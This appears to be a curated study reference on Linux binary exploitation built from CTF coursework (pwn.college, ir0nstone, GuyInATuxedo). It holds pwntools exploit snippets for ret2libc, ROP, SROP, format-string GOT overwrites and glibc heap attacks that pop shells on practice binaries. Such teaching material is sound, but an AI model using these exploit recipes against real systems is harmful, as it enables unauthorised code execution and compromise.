# Western corpus · Linux pwn coursework (pwn.college / ir0nstone / GuyInATuxedo)

> Positioning: recipe-driven exploitation workflows and tooling commands complementing our theory files (`platforms/06-binary-vuln/heap-exploitation.md`, `vuln-types-exploitation.md`). Our files explain ptmalloc internals and vuln spectra; this file adds exercise-driven recipes, per-bug-class debugger commands, format-string arithmetic, and era-specific applicability (glibc 2.26 → 2.34+). No basics re-explained.

## 0. Curriculum ladder (what these courses teach, in order)

pwn.college dojos (src: pwn.college)
Author: pwn.college (ASU CSE)
- Public dojo structure: Program Security → System Security → Software Exploitation (belt-earning core), plus community dojos (x86 Exploitation, ARM, Kernel Exercise Collection, Pwntools Tutorials).
- Software Exploitation dojo modules: Format String Exploits (24 ch) → File Struct Exploits (21) → Exploitation Primitives (20) → Dynamic Allocator Exploitation (17) → Kernel Exploitation (8). Challenge content is login-gated; module names define the exercise ladder.
- GuyInATuxedo "Nightmare" ordering teaches the same ladder per-topic: bof_variable → callfunction → shellcode → static ROP → dynamic ROP (leak-first) → fmt strings → partial overwrite → stack pivot → SROP → ret2csu → heap (tcache/houses) → FILE struct.
> Same approach: pick the module matching the bug class, mine the listed challenge writeups below for the concrete recipe.

## 1. Tooling & baseline workflow

### De Bruijn Sequences (src: ir0nstone.gitbook.io)
Author: ir0nstone
- Unique-substring pattern → crash RIP maps to exactly one offset.
```
ragg2 -P 100 -r            # generate 100-char pattern (ASCII)
r2 -d -A vuln; dc          # run, feed pattern, note fault addr e.g. 0x41534141
wopO `dr eip`              # -> 52 (offset to saved RIP)
```
- pwntools equivalent: `cyclic(100)` / `cyclic_find(core.read(target, 4))`.
> Same approach: never hand-brute padding; one cyclic run gives the offset for every later payload in that binary.

### Debugging with GDB/GEF (src: guyinatuxedo.github.io)
Author: GuyInATuxedo
- Per-bug-class debugger loop: `b main` / `b *main+25` / `b *0x8048414`; `disass main`; `ni` (step over), `si` (step into), `r` to rerun.
- Leak verification: `vmmap` for RELRO/segment perms, `search-pattern <bytes>` to locate a leaked pointer (e.g. resolved `fgets` addr in GOT), `p fgets` for libc symbol values.
- PIE binaries: `gdb.attach(target, gdbscript='pie b *0x147b')` (pwndbg `pie` command breaks on file offset).
> Same approach: set the breakpoint one instruction after the vulnerable read, dump the stack/heap pane, and read the exact overflowed layout before writing the exploit.

### ret2win baseline (src: ir0nstone.gitbook.io)
Author: ir0nstone
- `afl` in radare2 to find `win`/`flag`; `rabin2 -I vuln` for endianness; `p32/p64` to pack.
```python
from pwn import *
p = process('./vuln')
payload = b'A' * 52 + p32(0x080491c3)
p.clean(); p.sendline(payload); p.clean()
```
- Padding must be a byte string (`b'A'*52`), else TypeError from p32() bytes concat; `p.pause()` to attach a debugger mid-exploit.
> Same approach: this is the template every later chain extends — only the target address and the pre-RIP slots change.

## 2. Stack exploitation, leak-first era

### ret2libc manual offsets (src: ir0nstone.gitbook.io)
Author: ir0nstone
- `ldd ./vuln` (with ASLR off via `/proc/sys/kernel/randomize_va_space=0`) for libc + base; offsets via `readelf -s libc.so.6 | grep system` and `strings -a -t x libc.so.6 | grep /bin/sh`.
```python
libc.address = 0xf7dc2000                       # from leak
system = libc.sym['system']; binsh = next(libc.search(b'/bin/sh'))
payload  = b'A'*76 + p32(system) + p32(0x0) + p32(binsh)          # 32-bit: args on stack
payload  = b'A'*72 + p64(POP_RDI) + p64(binsh) + p64(system)      # 64-bit: pop rdi; ret
```
- Find POP_RDI with `ROPgadget --binary vuln | grep rdi`.
> Same approach: offsets differ per libc build — always re-derive from the target's own libc file, never reuse writeup constants.

### ret2plt two-stage ASLR bypass (src: ir0nstone.gitbook.io)
Author: ir0nstone
- Stage 1 leak: call `puts@plt(puts@got)` then return to `main` — restarts the bug with libc known.
```python
payload = flat('A'*32, elf.plt['puts'], elf.sym['main'], elf.got['puts'])
puts_leak = u32(p.recv(4))                       # puts stops at NUL: take first 4 bytes
libc.address = puts_leak - libc.sym['puts']      # elf.libc must match remote version
# stage 2:
payload = flat('A'*32, libc.sym['system'], libc.sym['exit'], next(libc.search(b'/bin/sh\x00')))
```
- 64-bit: `rop.call(elf.plt.puts, [elf.got.puts])` with pwntools ROP class handles the pop rdi chain.
> Same approach: the leak → return-to-main → second payload loop is the default shape for any NX+ASLR binary with a PLT output function.

### Stack canary: leak, LSB-truncate, fork-brute (src: ir0nstone.gitbook.io + guyinatuxedo.github.io)
Author: ir0nstone, GuyInATuxedo
- Canary ends in `0x00`; find its `%N$p` slot in a debugger (random-looking, not f7/ff-prefixed), echo it back:
```python
p.sendline('%23$p'); canary = int(p.recvline(), 16)
payload = b'A'*64 + p32(canary) + b'A'*12 + p32(win)
```
- LSB-truncation leak (svc): overflow exactly one byte over the canary's null byte, then read the 7 leaked bytes back: `canary = u64(b'\x00' + p.recv(7))`.
- fork() servers copy memory exactly (canary, PIE, libc identical per child) → byte-by-byte brute of canary+RBP+RIP (24 bytes), crash-vs-response as oracle (HTB Rope pattern).
> Same approach: leak beats brute; brute only when the process re-forks so state persists.

### Stack alignment / movaps crashes (src: ir0nstone.gitbook.io)
Author: ir0nstone
- x86-64 ABI: RSP 16-byte aligned at `call`; `system` uses SSE (`movaps`) → segfault if misaligned. Symptom: works locally, dies remotely / after swapping libc.
```python
ret = elf.address + 0x2439
rop.raw(POP_RDI); rop.raw(0x4); rop.raw(ret); rop.raw(system)   # extra ret re-aligns
```
> Same approach: any 64-bit libc call in a ROP chain gets a bare `ret` gadget inserted before it when crashes look unmotivated.

### Weird input encodings & leak parsing (src: guyinatuxedo.github.io)
Author: GuyInATuxedo
- fbCTF overfloat: input parsed as floats — pack chain words as two float32 strings:
```python
def sendVal(x):
    v1, v2 = x & 0xffffffff, x >> 32
    target.sendline(str(uf(p32(v1)))); target.sendline(str(uf(p32(v2))))
```
- Leaks arrive short (puts stops at NUL): `leak = u64(p.recv(6).ljust(8, b'\x00'))`; printf-given leak: `base = int(leak,16) - libc.sym['printf']` (babyboi).
> Same approach: adapt the transport, keep the chain; normalize every leak with ljust-NUL before u64.

## 3. Modern ROP chains

### ret2csu gadget pair + 2.34 hardening (src: ir0nstone.gitbook.io + guyinatuxedo.github.io)
Author: ir0nstone, GuyInATuxedo
- Static non-PIE binaries lacking rdi/rsi/rdx gadgets still carry `__libc_csu_init`:
```
g1: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
g2: mov rdx, r14; mov rsi, r13; mov edi, r12d; call qword [r15 + rbx*8]
```
- `call [r15+rbx*8]` dereferences — point it at memory holding the target address (e.g. a GOT slot). Set rbx=0, rbp=1 so g2's epilogue `add rbx,1; jne`-loop falls through back into the pops.
- ROPEmporium chain: `g1, rbx=0, rbp=1, r12=&ptr-to-ret2win, r13/r14=filler, r15→rdx-source, g2, 7 filler qwords (add rsp,8 + 6 pops), ret2win`.
- Era gate: glibc 2.34 removed `__libc_csu_init` entirely (patch breaks ABI) — ret2csu only exists in binaries linked against ≤2.33 or with old-style CSU.
> Same approach: use ret2csu when you need rsi/rdx for `write(1, got, 8)`-style leaks or execve args; prefer plain ret2libc when only rdi matters.

### one_gadget + malloc/free hooks (src: ir0nstone.gitbook.io + guyinatuxedo.github.io)
Author: ir0nstone, GuyInATuxedo
```bash
gem install one_gadget; one_gadget libc.so    # prints offsets + constraints
```
- Each gadget has register/stack constraints printed alongside — some libcs have none usable; verify in GDB at the call site. Usage: `base + offset` as return address, or written into a GOT/hook slot.
- Hook trigger without a malloc call: `printf("%10000$c")` forces libc to heap-allocate the output buffer. `__free_hook` analogous (overwrite, then `free()`).
- dcquals19 babyheap (tcache era): tcache poisoning → write one_gadget into `__malloc_hook`, trigger `malloc(10)`.
- Era gate: hooks exist only in glibc ≤2.33 (removed in 2.34); on 2.34+ aim the same write at `__free_hook`-era replacements (exit handlers / FSOP) instead.
> Same approach: one_gadget is the cheap end-of-chain; when constraints fail, fall back to `system("/bin/sh")` via pop rdi.

### SROP core (src: ir0nstone.gitbook.io)
Author: ir0nstone
- When no rdi/rsi/rdx gadgets exist but a `syscall` and `pop rax` do: trigger `rt_sigreturn` (rax=15) and let the kernel load a full register frame from RSP.
```python
frame = SigreturnFrame()
frame.rax = 0x3b; frame.rdi = BINSH; frame.rsi = 0; frame.rdx = 0
frame.rip = SYSCALL_RET                       # frame re-enters syscall to run execve
payload = b'A'*8 + p64(POP_RAX) + p64(0xf) + p64(SYSCALL_RET) + bytes(frame)
```
- `context.arch = 'amd64'` before building the frame; the binary must contain `/bin/sh` (appendable: `echo -en "/bin/sh\x00" >> vuln`) and a reachable syscall gadget.
> Same approach: SROP = "one gadget that sets every register"; reach for it in tiny static binaries (CSAW smallboi-class).

### SROP variants: rax via alarm, mprotect frame, frame shift (src: guyinatuxedo.github.io)
Author: GuyInATuxedo
- No `pop rax`? Call `alarm(0xf)` then `alarm(0)` — alarm's return value lands rax=15 (InCTF stupidrop), also uses `gets` to stage "/bin/sh" into bss first.
- Frame sits after the sigreturn-call's return slot: `payload += str(frame)[8:]` when the frame starts at the ret-address boundary (smallboi).
- No execve path at all → frame an `mprotect(0x400000, 0x1000, 7)` call with `frame.rsp` pointing at a second-stage stack holding shellcode (swampCTF syscaller).
- Pure-frame variant: binary does nothing but `read` then sigreturn — send the frame itself with `frame.rip = syscall; frame.rax = 1` write-syscall to dump the flag (backdoor funsignals).
> Same approach: anything that sets rax (alarm, read count, cmp results) plus any syscall gadget is an SROP trigger.

### Stack pivoting: three pivots (src: ir0nstone.gitbook.io + guyinatuxedo.github.io)
Author: ir0nstone, GuyInATuxedo
- Only ~16 bytes past RIP? Move RSP to a fake stack (.bss):
  - `pop rsp` (rare); `pop <reg>; xchg <reg>, rsp` (needs ~16 bytes); `leave; ret` needs only 8:
```
<fake_stack_addr>      # overwrites saved RBP
<leave;ret gadget>     # overwrites RIP; leave = mov rsp,rbp; pop rbp
```
- 32-bit NX-off variant (b0verflow): buffer holds `jmp esp` gadget + shellcode above the saved RIP, ret lands on `sub esp,0x24; ret`-style pivot back into the buffer.
- ret-sled + partial RBP overwrite (speedrun4): fill with `ret` gadgets, end chain in bss-write + execve ROP, final byte `\x00` truncates saved RBP so the epilogue pivots into the sled.
> Same approach: compute how many bytes you control past RIP; ≤8 → leave;ret on RBP, ≤16 → xchg, more → straight ROP.

### Partial overwrite & 4-bit brute force (src: guyinatuxedo.github.io)
Author: GuyInATuxedo
- Low 1-2 bytes of code pointers are page-relative under PIE/ASLR: overwrite LSB only (vulnchat2: `b'0'*0x2b + b'\x72'` redirects a nearby return without any leak).
- 2-byte overwrite where only the low nibble is known (stack alignment): brute the upper nibble — 16 tries; use `vsyscall` entries (`0xffffffffff600800`) as ROP-NOPs to pad the chain while brute-forcing (hack.lu stackstuff: `i += 0x10` loop over remote reconnects).
> Same approach: partial overwrite is the cheapest PIE/ASLR bypass when the target function/gadget shares a page with the smashed pointer.

### ret2dlresolve: pwntools automated + manual 32-bit (src: ir0nstone.gitbook.io + guyinatuxedo.github.io)
Author: ir0nstone, GuyInATuxedo
- Trick the lazy resolver into resolving `system` with no libc leak: PLT0 pushes `reloc_offset`; `_dl_runtime_resolve` indexes JMPREL (`Elf32_Rel`), whose `r_info>>8` indexes SYMTAB (`Elf32_Sym`), whose `st_name` offsets STRTAB. Fake all three in writable memory.
```python
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
rop.raw('A'*76); rop.read(0, dlresolve.data_addr); rop.ret2dlresolve(dlresolve)
p.sendline(rop.chain()); p.sendline(dlresolve.payload)
```
- Manual (0ctf babystack): stage in bss — `r_info = (((bss+0xc - dynsym)/0x10) << 8) | 7`; write Elf32_Rel{r_offset=alarm_got, r_info}, Elf32_Sym{st_name=(bss+28)-dynstr}, "system\0", "/bin/sh\0"; final chain calls PLT0 (`resolve`) with `reloc_offset = bss - relplt` and `/bin/sh` ptr as stack arg.
- Gate: requires lazy binding — full RELRO / BIND_NOW kills it.
> Same approach: the no-leak escape hatch for 32-bit static-ish binaries; 64-bit needs `Elf64_Rela` + version-index care (pwntools handles).

### GOT overwrite & RELRO triage (src: ir0nstone.gitbook.io + guyinatuxedo.github.io)
Author: ir0nstone, GuyInATuxedo
```python
payload = fmtstr_payload(5, {elf.got['printf']: libc.sym['system']})   # offset 5 = buffer slot
p.sendline(payload); p.sendline('/bin/sh')
```
- Partial RELRO only moves GOT above variables (blocks overflow-into-GOT, not fmt writes); Full RELRO makes GOT read-only — check with `vmmap` (r-- on .got.plt) and `search-pattern <libc addr>` to see whether the resolved pointer is writable.
- Fastbin-era GOT swap (CSAW auir): fake-chunk malloc near bss heap-ptr array → repoint chunk ptr to `free@got` → write `system`, then free a "/bin/sh" chunk.
> Same approach: GOT overwrite is the generic code-exec sink for any arbitrary write; RELRO level decides whether you target .got.plt or fall back to hooks/FSOP.

## 4. Format-string arithmetic

### Reads: offset discovery and %s deref (src: ir0nstone.gitbook.io)
Author: ir0nstone
- Find your buffer's slot with a marker: `ABCD|%6$p` echoing `0x44434241` ⇒ slot 6; then `%N$p` picks canary/PIE/libc slots directly.
- Arbitrary read: `%s` dereferences a stack slot — place the address in-input after the specifiers, padded so it occupies one aligned word:
```python
payload = b'%8$p||||' + p32(0x8048000)   # pads so address = exactly 2 slots later
```
- Marker before address because `%s`/printf stop at NUL bytes inside p32 addresses.
> Same approach: one `%p` sweep in GDB (match against stack pane) maps every slot you'll ever need in that binary.

### Writes: %n counting and fmtstr_payload (src: ir0nstone.gitbook.io)
Author: ir0nstone
- `%n` stores chars-printed-so-far into the pointed slot; control the count by width padding:
```python
payload = p32(AUTH) + b'|'*6 + b'%7$n'      # 4 addr bytes + 6 pads -> writes 10
payload = fmtstr_payload(7, {AUTH: 10})     # pwntools, multi-write dict form
```
- 64-bit note: first 5 slots are registers, values are 8 bytes — offsets shift by ~5-6 vs 32-bit.
> Same approach: manual `%n` only when payload-length limits force it; otherwise `fmtstr_payload(offset, {addr: val})`.

### Manual split-word writes (2-byte granularity) (src: guyinatuxedo.github.io)
Author: GuyInATuxedo
- Writing full 4-byte values with one `%n` needs ~10^9 padding chars — split into 2-byte halves at `addr` and `addr+2`, order writes ascending:
```python
x = (system & 0xffff) - 8                        # -8 for the 2 addrs already printed
y = ((system & 0xffff0000) >> 16) - (system & 0xffff)
payload = p32(got) + p32(got+2) + b'%' + str(x).encode() + b'x%19$n' + b'%' + str(y).encode() + b'x%20$n'
```
- tw16 greeting pattern: four addresses (fini_array, fini_array+2, strlen_got, strlen_got+2) then three `%<width>x %N$n` — reuses one width for the shared high half (`0x0804`) via two `%n` on one count; re-point fini_array to loop main, GOT strlen → system, then send "/bin/sh".
- Remote with fmt-length cap: split the payload across two `edit` writes into adjacent heap slots (betstar).
> Same approach: compute per-half widths arithmetically, never emit >65535 padding in one spec (stack/`%n` limits).

## 5. PIE/ASLR: leak-first templates

### PIE bypass via format-string leak (src: ir0nstone.gitbook.io)
Author: ir0nstone
- Offsets within the binary are constant; leak any binary address off the stack and subtract:
```python
p.sendline('%3$p'); elf_leak = int(p.recvline(), 16)
elf.address = elf_leak - 0x11d5               # offset leak-vs-base, derived in debugger
payload = b'A'*32 + p32(elf.sym['win'])
```
- Derive the subtractor once by breaking at the printf and comparing leak to `vmmap` base; it changes per build, not per run.
> Same approach: `elf.address = leak - known_offset` then use `elf.sym[]`/`elf.plt[]` everywhere — identical shape for libc leaks (`libc.address = puts_leak - libc.sym['puts']`).

### One-shot dual leak (PIE + libc) (src: guyinatuxedo.github.io)
Author: GuyInATuxedo
- A single `%x.%x` echo can carry both bases when two stack remnants line up:
```python
leak = getLeaks().split('.')
pieBase   = int(leak[0], 16) - 0x105c
libcBase  = int(leak[1], 16) - 0x1d85c0
```
- Caution (ir0nstone): stack remnants differ per libc build — re-derive both subtractors against the remote libc; values may not exist at all remotely.
> Same approach: grab every pointer the vulnerable printf touches before building any chain.

## 6. Heap: glibc-era recipes

### tcache mechanics + poisoning via double free (src: guyinatuxedo.github.io)
Author: GuyInATuxedo
- tcache = per-size singly-linked LIFO, 7 chunks/bin, sizes ≤0x410, checked before fastbins (glibc 2.26+; ir0nstone dates it 2.27 — initial release had none of the fastbin defenses, so 2.26/2.27 is *easier* to pwn than 2.25).
- Poisoning = control `next` of a freed tcache entry ⇒ malloc returns your target two allocs later. PlaidCTF cpp (2.27):
```python
remove(5); remove(5)                                   # double free (no key check yet in 2.27)
add("x", p64(libcBase + libc.sym['__free_hook']))      # alloc0 lands on dup chunk; write next=free_hook
add("x", p64(libcBase + libc.sym['system']))           # alloc1 = free_hook; write system
add("name", "/bin/sh\x00")                             # next free() -> system("/bin/sh")
```
- dcquals19 babyheap: overflow chunk size (0x71→0x81-style confusion) to get an over-long tcache entry that overwrites the *next* chunk's next-ptr with `__malloc_hook`; then one_gadget.
> Same approach: tcache poisoning is the default 2.26+ arbitrary-write-for-heap; target = `__free_hook`/`__malloc_hook` (≤2.33) or function pointers in reach.

### Tcache keys: double-free detection & its leak (src: ir0nstone.gitbook.io)
Author: ir0nstone
- 2.29+: `tcache_put` stamps `e->key = tcache_perthread_struct`; `_int_free` matches key then walks the bin → abort "double free detected in tcache 2".
- Bypass: any UAF write into the freed chunk corrupts `key` (single-byte write works ~255/256). `tcache_get` does no key check, so poisoning itself is unaffected.
- 2.29–2.33 side effect: the key *is* the tcache struct address = `heap_base + 0x10` → leaking the key = heap leak. 2.34 switched to a random `getrandom()` key, killing that leak vector.
> Same approach: on ≥2.29 always zero/alter the key before the second free.

### Safe-Linking: mangled fd/next (src: ir0nstone.gitbook.io)
Author: ir0nstone
- glibc 2.32+: fastbin/tcache `next` stored as `(pos >> 12) ^ ptr` where pos = address storing the pointer:
```python
def protect_ptr(pos, ptr):   return (pos >> 12) ^ ptr
def reveal_ptr(pos, stored): return (pos >> 12) ^ stored
```
- With a heap leak the XOR key is fully known — demangle to leak more, forge to aim anywhere. Without one, partial low-byte overwrite costs a 4-bit key guess (bits 12-15 of the address) ≈ 1/16 per attempt.
- Ships with `aligned_OK`/`misaligned_chunk` 16-byte alignment checks in `tcache_get`/`_int_malloc`/`_int_free`/`malloc_consolidate` — misaligned partial overwrites die outright.
> Same approach: heap leak first, then poison — safe-linking makes leakless heap attacks a 1/16 dice roll.

### Unsorted bin attack (src: guyinatuxedo.github.io)
Author: GuyInATuxedo
- Removal from unsorted bin writes a main_arena pointer to `bk + 0x10` (x64) — set the freed chunk's bk to `target - 0x10`, then malloc that size:
```python
add(0xf0, "a"); add(0xf0, "b"); add(0x30, "c")   # b is victim, c guards top
delete(1)                                        # b -> unsorted bin
edit(0, 0x110, b'0'*0xf8 + p64(0x101) + b'1'*8 + p64(magic - 0x10))
add(0xf0, "x")                                   # unsorted removal writes arena ptr to magic
```
- Value written is a large arena pointer — useful for `magic > threshold` style globals (HITCON magicheap), not for precise values. Run on tcache-less sizes/versions (fill the 7-entry tcache first on 2.26+).
> Same approach: the "write a big constant somewhere" primitive; pair with a global-flag check in the binary.

### Fastbin attack (src: guyinatuxedo.github.io)
Author: GuyInATuxedo
- Pre-tcache path: overwrite freed chunk's `fd` with a fake chunk address; malloc twice returns it. Checks: "double free or corruption (fasttop)" (top-of-bin == freed chunk) — bypass free(a);free(b);free(a); "memory corruption (fast)" demands a valid size field at fake_chunk+8 in the fastbin range.
- CSAW auir end-to-end: `fakeChunk = bss_region - 0x23` (so fake size lands on a suitable value) → alloc onto bss heap-ptr array → retarget chunk 0's ptr to `free@got` → write `system` → `free("/bin/sh chunk")`.
> Same approach: on 2.26+ first drain tcache (7 allocs) to fall back into fastbin behavior.

### unlink() and safe-unlink (src: ir0nstone.gitbook.io)
Author: ir0nstone
- Classic unlink writes both ways: `FD=P->fd; BK=P->bk; FD->bk=BK; BK->fd=FD` — fd/bk point at chunk *starts*, so P->fd is +0x10 (64-bit: fd +0x10, bk +0x18 offsets from P).
- Modern macro first checks `FD->bk == P && BK->fd == P` ("corrupted double-linked list") — restricts writes to self-consistent fake chunks; both writes land, so either target must be writable.
- Heap-groom entry point: overflow prev_size + clear PREV_INUSE to trigger backward consolidation into your fake chunk.
> Same approach: unlink survives as a *consolidation trigger* inside newer houses more than a standalone write.

### House variants applicability table (src: guyinatuxedo.github.io)
Author: GuyInATuxedo
- House of Spirit: write two fake size fields (fastbin-range sizes, first = target malloc's rounded size) at a controlled region (stack/bss), free the fake pointer → malloc returns it. Needs: a `free(arbitrary_ptr)` primitive, no heap leak.
- House of Lore: smallbin attack — overwrite victim's `bk` to fake stack chunk whose `fd`/`bk` point back consistently (3 chunks total); allocations walk into the fake. Needs: editable smallbin chunk + big-enough allocation to sort it into smallbin; more setup than fastbin.
- House of Force: overflow top-chunk size to `0xffffffffffffffff`, then `malloc(target - wilderness - 0x20)` walks the top anywhere (bss/GOT); second malloc overlaps target. Needs: top-size overwrite + huge-size malloc accepted.
- House of Einherjar: null-byte overflow clears PREV_INUSE; fake prev chunk (fd/bk/nextsize self-pointing) set at the target region; consolidation walks the heap up to it → malloc returns near-target. Needs: write access to target region beforehand + null-byte overflow + leaks.
- Era note (ir0nstone Malloc Maleficarum): the original houses are cornerstones but "no longer possible" as-is on modern glibc — each has a version gate (top-size sanity checks, safe-unlink, tcache) — treat the table as technique-selection for the target's glibc, and re-verify checks in that version's malloc source.
> Same approach: choose by primitive first (arbitrary free → Spirit; null-byte overflow → Einherjar; top overwrite → Force; smallbin edit → Lore).

### House of Orange: top-chunk → unsorted → FSOP (src: guyinatuxedo.github.io)
Author: GuyInATuxedo (exploit by Angelboy)
- No free() in the binary: shrink top size via overflow, then a big malloc makes sysmalloc `_int_free` the old top into the unsorted bin (also the libc-leak source).
- Chain the unsorted bin into `_IO_list_all` (unsorted write targets it), forge a `_IO_FILE` with `/bin/sh` as first qword, `_mode<=0`, vtable pointing at fake table whose overflow slot = `system`; next malloc's error path (`malloc_printerr` → abort → flush) executes it:
```python
stream  = b'/bin/sh\x00' + p64(0x61)
stream += p64(0) + p64(io_list_all - 0x10)        # unsorted attack into _IO_list_all
stream  = stream.ljust(0xa0, b'\x00') + p64(heap+0x700-0xd0)   # _wide_data
stream  = stream.ljust(0xc0, b'\x00') + p64(1)                 # _mode < 0 check via vtable trick
payload += stream + p64(0)*2 + p64(vtable_addr) + p64(1)*3 + p64(0)*3 + p64(system)
```
- Era gate: pre-2.24 vtable layout; modern glibc added vtable validation — post-2.24 needs `_IO_str_jumps`-style legitimate-vtable variants.
> Same approach: when the bug is heap-only and there is no free, Orange is the bridge from heap corruption to FILE-struct execution; pair with our FILE/FSOP theory notes.

### Negative-index free into tcache metadata (src: guyinatuxedo.github.io)
Author: GuyInATuxedo
- popping_caps (modern libc): `free()` accepts a negative index → free a "chunk" overlapping the tcache_perthread_struct itself; then a malloc+write rewrites tcache counts/entries directly, redirecting the next allocation onto `__malloc_hook` (caps0) or forging the whole struct with `__free_hook` + "/bin/sh" inline (caps1):
```python
malloc(0x3a0); free(0); free(-528)          # free ptr arithmetic lands inside tcache struct
malloc(0xf0); write(p64(mallocHook))        # hijack entries[...] via normal write
malloc(0); write(p64(libcBase + 0x10a38c))  # one_gadget into hook
```
> Same approach: any OOB array index on malloc/free primitives aims first at the tcache struct — it converts a memory-safety index bug into direct allocation control.

## 7. Era matrix (glibc version gates, source-backed)

| Gate | Version | Effect on chains |
|---|---|---|
| tcache introduced | 2.26 (giat; ir0nstone says 2.27) | fastbin-style poisoning moves to tcache; initial tcache lacks double-free checks → easier than 2.25 |
| tcache key | 2.29 | straight double-free in tcache aborts; corrupt key first; key = heap leak until 2.33 |
| safe-linking + alignment checks | 2.32 | `next`/`fd` mangled `(pos>>12)^ptr`; leakless partial overwrite ≈ 1/16 |
| random tcache_key | 2.34 | key no longer reveals `heap_base+0x10` |
| `__libc_csu_init` removed | 2.34 | ret2csu dead in binaries compiled against ≥2.34 (ABI break, old binaries still run) |
| hooks (`__malloc_hook`/`__free_hook`) | removed by 2.34 era | one_gadget targets shift to exit handlers / FSOP (see babyheap/one_gadget entries) |

## Sources

- ir0nstone cybersecurity notes (gitbook): stack exploitation, ROP, PIE/ASLR/RELRO, format strings, SROP, ret2csu (+CSU hardening), ret2dlresolve, one_gadgets-and-malloc-hook, forking processes, heap (double-free protections, unlink, tcache keys, safe-linking) — fetched 2026-10-19
- GuyInATuxedo "Nightmare" pwn notes (github.io repo, shallow clone): 02-intro_tooling (gdb-gef), 08-bof_dynamic, 10-fmt_strings, 15-partial_overwrite, 16-srop, 17-stack_pivot, 18-ret2_csu_dl, 28-fastbin_attack, 29-tcache, 31-unsortedbin_attack, 39-43 house_of_*, 44-more_tcache, 5.1/7.1/7.2 mitigation pages — fetched 2026-10-19
- pwn.college: dojo/module listings (Software Exploitation, Program Security, community dojos); challenge bodies login-gated — fetched 2026-10-19
